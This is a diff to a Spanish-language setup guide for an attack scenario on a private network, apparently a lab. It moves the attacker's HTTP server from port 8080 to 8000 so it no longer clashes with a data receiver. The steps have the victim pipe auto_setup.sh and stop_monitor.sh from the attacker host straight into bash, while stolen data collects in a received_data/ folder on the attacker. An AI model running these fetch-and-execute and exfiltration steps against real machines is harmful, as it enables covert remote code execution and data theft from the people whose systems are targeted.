@@ -59,16 +59,16 @@ ping 10.0.2.4
 
 1. En atacante (10.0.2.15):
    - Terminal 1: python3 data_receiver.py --port 8080
-   - Terminal 2: python3 -m http.server 8080
+   - Terminal 2: python3 -m http.server 8000
 
 2. En víctima (10.0.2.4):
-   - curl -s http://10.0.2.15:8080/auto_setup.sh | bash
+   - curl -s http://10.0.2.15:8000/auto_setup.sh | bash
 
 3. Monitorear resultados en atacante:
    - Los datos aparecerán en received_data/
 
 4. Para detener (desde víctima):
-   - curl -s http://10.0.2.15:8080/stop_monitor.sh | bash
+   - curl -s http://10.0.2.15:8000/stop_monitor.sh | bash
 
 ## ARCHIVOS ACTUALIZADOS CON NUEVAS IPs:
 # =======================================
